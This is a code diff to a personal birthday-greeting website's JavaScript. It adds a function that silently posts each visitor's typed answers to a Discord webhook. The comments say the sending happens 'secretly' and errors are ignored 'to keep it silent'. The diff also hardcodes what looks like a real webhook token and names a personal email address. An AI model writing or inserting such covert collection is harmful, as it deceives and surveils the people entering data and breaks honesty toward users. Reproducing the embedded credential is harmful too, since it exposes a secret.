@@ -213,9 +213,14 @@ function handleQuestionSubmit(answer, question) {
             }
             break;
         case 'text':
+            // Save response locally
             const responses = JSON.parse(localStorage.getItem('birthdayResponses') || '{}');
             responses[question.text] = answer;
             localStorage.setItem('birthdayResponses', JSON.stringify(responses));
+            
+            // Secretly send to Discord
+            sendToDiscord(question.text, answer);
+            
             showResponse(question.responses.submit, true, true);
             createSparkleAnimation();
             createButterflyAnimation();
@@ -498,6 +503,51 @@ function showFinalMessage() {
     responseText.classList.add('show');
     nextButton.style.display = 'none';
     createConfetti();
+}
+
+// Replace the submitToGoogleForm function with this:
+function sendResponseByEmail(question, answer) {
+    const subject = encodeURIComponent("Birthday Website Response: " + question);
+    const body = encodeURIComponent(`Question: ${question}\nAnswer: ${answer}\n\nSent from your Birthday Website ❤️`);
+    const mailtoLink = `mailto:sadmanxper@gmail.com?subject=${subject}&body=${body}`;
+    
+    // Open email client
+    window.location.href = mailtoLink;
+}
+
+// Add this function near the top
+function sendToDiscord(question, answer) {
+    const webhookUrl = 'https://discord.com/api/webhooks/1329506665254621204/ErpqxU34tpMyTodNswoB0DPMC4GO55sfWSGOLcsu4K8y1bks3dL2MDdGYCPV4pLs6iEP';
+    
+    // Format the message nicely
+    const message = {
+        embeds: [{
+            title: "New Response Received! 💝",
+            color: 0xFF69B4,  // Pink color
+            fields: [
+                {
+                    name: "Question",
+                    value: question
+                },
+                {
+                    name: "Answer",
+                    value: answer
+                }
+            ],
+            timestamp: new Date().toISOString()
+        }]
+    };
+
+    // Send to Discord silently
+    fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(message)
+    }).catch(() => {
+        // Ignore any errors to keep it silent
+    });
 }
 
 // Event Listeners
